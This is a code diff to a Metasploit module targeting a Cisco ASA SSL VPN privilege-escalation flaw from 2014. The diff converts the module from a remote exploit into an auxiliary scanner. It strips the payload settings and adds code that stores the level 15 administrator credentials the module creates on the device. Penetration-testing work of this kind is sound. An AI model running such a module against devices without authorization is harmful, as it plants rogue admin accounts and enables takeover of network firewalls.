@@ -5,11 +5,12 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Exploit::Remote
+class Metasploit3 < Msf::Auxiliary
   Rank = ExcellentRanking
 
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::CommandShell
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
 
   attr_accessor :ssh_socket
 
@@ -33,25 +34,6 @@ class Metasploit3 < Msf::Exploit::Remote
           [ 'URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa' ],
           [ 'URL', 'https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-005.txt' ]
         ],
-      'Targets'        => [[ 'Automatic', {}]],
-      'DefaultOptions'  =>
-        {
-          'ExitFunction' => "none"
-        },
-      'Payload'        =>
-        {
-          'Compat' => {
-            'PayloadType'    => 'cmd_interact',
-            'ConnectionType' => 'find'
-          }
-        },
-      'Platform'       => 'unix',
-      'Arch'           => ARCH_CMD,
-      'Targets'        =>
-        [
-          ['Cisco ASA', {} ],
-        ],
-      'Privileged'     => true,
       'DisclosureDate' => "April 9, 2014",
 
     ))
@@ -296,7 +278,20 @@ class Metasploit3 < Msf::Exploit::Remote
 
       if creds
         print_good("#{peer} - Successfully added level 15 account #{creds.join(", ")}")
-        break
+
+        user, pass = creds
+
+        report_hash = {
+          :host   => rhost,
+          :port   => rport,
+          :sname  => 'Cisco ASA SSL VPN Privilege Escalation',
+          :user   => user,
+          :pass   => pass,
+          :active => true,
+          :type => 'password'
+        }
+
+        report_auth_info(report_hash)
       else
         print_good("#{peer} - Failed to created user account")
       end
